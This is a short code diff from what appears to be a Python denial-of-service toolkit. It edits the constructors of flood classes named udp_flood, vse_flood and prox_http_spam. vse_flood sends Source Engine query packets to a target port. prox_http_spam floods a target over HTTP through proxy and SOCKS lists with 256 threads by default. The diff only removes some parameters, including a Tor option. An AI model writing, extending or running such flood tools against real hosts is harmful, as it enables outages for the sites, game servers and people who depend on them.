@@ -197,7 +197,7 @@ class udp_flood:
   return a
   
 class vse_flood:
- def __init__(self,u,p=80,threads_daemon=True,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=True,logs=False):
+ def __init__(self,u,p=80,threads_daemon=True,interval=0.001,connection=True,duration=60,threads=1,limiting=True,logs=False):
   self.target=u
   self.port=p
   self.payload=b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
@@ -452,7 +452,7 @@ class http_spam:
 
 
 class prox_http_spam:
- def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
+ def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False):
   self.logs=logs
   self.cookie=cookie
   self.user_agents=user_agents
